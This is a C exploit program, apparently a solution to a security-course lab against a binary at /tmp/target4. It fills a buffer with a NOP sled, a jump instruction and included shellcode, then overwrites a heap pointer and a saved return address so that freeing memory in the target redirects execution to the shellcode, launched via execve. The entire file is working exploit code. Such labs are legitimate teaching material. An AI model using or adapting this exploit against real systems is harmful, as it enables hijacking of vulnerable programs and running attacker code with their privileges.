#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char sploit[500 + 8 + 4 + 1];

  memset(sploit, 0x90, sizeof sploit); // NOP NOP NOP

  // instruction: jmp 6 bytes
  sploit[0] = 0xeb;
  sploit[1] = 0x06;

  // ensure free bit is ON
  sploit[4] |= 0x01;
  memcpy(sploit + 8, shellcode, sizeof shellcode - 1);
    
  *((int *) (sploit + 504)) = 0x804a068;  // beginning of p, where we're putting the sploit
  *((int *) (sploit + 508)) = 0xbffffc64; // eip
  
  sploit[512] = '\0';

  args[0] = TARGET; args[1] = sploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
